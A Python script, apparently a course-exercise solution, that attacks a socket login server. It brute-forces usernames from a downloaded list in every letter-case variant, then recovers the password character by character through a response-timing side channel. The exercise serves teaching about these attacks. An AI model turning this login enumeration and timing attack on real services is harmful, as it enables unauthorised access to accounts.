# write your code here
import sys
import socket
import string
import itertools
import requests
import json
import time

BUFFER_SIZE = 1024
MAX_NUM_PASSWORDS = 1_000_000
LOGINS_URL = "https://stepik.org/media/attachments/lesson/255258/logins.txt"

def variate(s):
    return set(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in s))))


def get_logins_from_url(url):
    logins = set()
    response = requests.get(url)
    for _login in response.text.splitlines():
        logins.update(variate(_login))
    return logins


# def generate_password(MAX):
#     counter = 0
#     for _password in get_passwords_from_url(PASSWORDS_URL):
#         passwords = variate_passwords(_password)
#         for password in passwords:
#             yield password
#             counter += 1
#             if counter == MAX:
#                 break


test = {
    "login": "admin",
    "password": ""
}

times = []

def time_average():
    return sum(times) / len(times)


def make_connection(ip, port):
    with socket.socket() as client_socket:
        client_socket.connect((ip, port))
        # find login
        for login in get_logins_from_url(LOGINS_URL):
            test["login"] = login
            client_socket.send(json.dumps(test).encode())
            response = json.loads(client_socket.recv(BUFFER_SIZE).decode())

            if response['result'] == "Connection success!":
                return json.dumps(test)
            elif response['result'] == "Wrong login!":
                continue
            elif response['result'] == "Wrong password!":
                break

        # case when login is found but password is not


        while response['result'] != "Connection success!":
            for letter in string.ascii_letters + string.digits:
                test["password"] += letter

                _start = time.perf_counter()
                client_socket.send(json.dumps(test).encode())
                response = json.loads(client_socket.recv(BUFFER_SIZE).decode())
                _stop = time.perf_counter()
                times.append(_stop - _start)

                if response['result'] == "Connection success!":
                    return json.dumps(test)
                elif response['result'] == "Wrong password!":
                    if times[-1] < time_average() * 1.5:
                        test["password"] = test["password"][:-1]
                        continue
                    break
                else:
                    raise Exception("Unpredicted response: " + response['result'])

                #elif response['result'] == "Exception happened during login":
                #    break


    return None


if __name__ == '__main__':
    ip = sys.argv[1]
    port = int(sys.argv[2])
    print(make_connection(ip, port))